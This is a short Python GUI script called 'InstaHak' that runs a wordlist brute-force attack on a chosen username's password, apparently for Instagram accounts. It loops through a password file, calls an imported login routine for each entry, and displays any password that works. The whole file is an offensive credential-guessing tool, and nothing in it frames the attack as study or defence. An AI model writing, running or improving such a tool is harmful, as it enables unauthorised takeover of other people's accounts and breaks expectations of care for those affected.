from core.instahak import *
import dearpygui.dearpygui as dpg

# not_hacker___

class app(InstaHak):
    def start_InstaHak(self):
        user = dpg.get_value('user')
        passlst = dpg.get_value('pas')
        with dpg.window(label=f"trying {passlst}", width=200, height=200, pos=(200, 300)):
            for pas in open(passlst, 'r').read().split():
                
                
                if self.login(user, pas):
                    print('found:', pas)
                    dpg.add_text(f'found: {pas}')
                    with dpg.window(label="found !",width=200, height=200):
                        dpg.add_text(f'found: {pas}')
                else:
                    print(pas)
                    dpg.add_text(f'{pas}')
                
    def start_app(self):
        dpg.create_context()

        with dpg.window(label="InstaHak", width=600, height=600):
            dpg.add_input_text(tag='user', label='username',pos=(100, 30))
            dpg.add_input_text(tag='pas', label='password', default_value='core/pl.txt',pos=(100, 60))
            dpg.add_button(label='start', callback=self.start_InstaHak, width=390, height=30, pos=(100, 100))
        dpg.create_viewport(title='InstaHak', width=600, height=600)
        dpg.setup_dearpygui()
        dpg.show_viewport()
        dpg.start_dearpygui()
        dpg.destroy_context()


app().start_app()
        